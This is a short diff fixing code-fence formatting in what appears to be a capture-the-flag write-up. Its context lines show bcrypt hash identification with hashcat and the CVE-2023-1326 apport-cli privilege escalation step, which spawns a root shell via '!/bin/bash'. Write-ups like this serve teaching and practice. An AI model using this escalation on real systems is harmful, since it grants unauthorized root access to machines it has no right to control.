@@ -120,7 +120,7 @@ Analyzing '$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12'
 [+] Blowfish(OpenBSD) 
 [+] Woltlab Burning Board 4.x 
 [+] bcrypt
-```bash
+```
 ```bash
 echo '$2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u' > hash
 hashcat --example-hashes | grep -B5 -A5 bcrypt
@@ -176,6 +176,6 @@ https://0xd1eg0.medium.com/cve-2023-1326-poc-c8f2a59d0e00
 sudo /usr/bin/apport-cli --file-bug
 
 Select 8 > View Report > !/bin/bash
-```bash
+```
 
 
